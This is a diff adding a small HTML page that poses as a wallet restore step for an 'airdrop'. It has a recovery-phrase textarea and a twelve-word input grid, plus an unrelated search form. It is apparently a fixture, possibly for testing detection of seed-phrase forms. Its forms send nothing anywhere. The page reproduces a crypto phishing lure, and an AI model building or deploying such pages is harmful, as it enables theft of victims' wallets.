@@ -1,0 +1,20 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>Restore your wallet</title></head>
+<body>
+  <h1>Validate your wallet to claim the airdrop</h1>
+  <form id="one" onsubmit="return false">
+    <textarea name="phrase" rows="3" cols="60"></textarea>
+    <button>Continue</button>
+  </form>
+  <form id="grid" onsubmit="return false">
+    <script>
+      for (let i = 1; i <= 12; i++) document.write(`<input type="text" name="w${i}" aria-label="Word ${i}"> `);
+    </script>
+    <button>Import</button>
+  </form>
+  <form id="other" onsubmit="return false">
+    <input type="text" name="search" aria-label="Search">
+  </form>
+</body>
+</html>
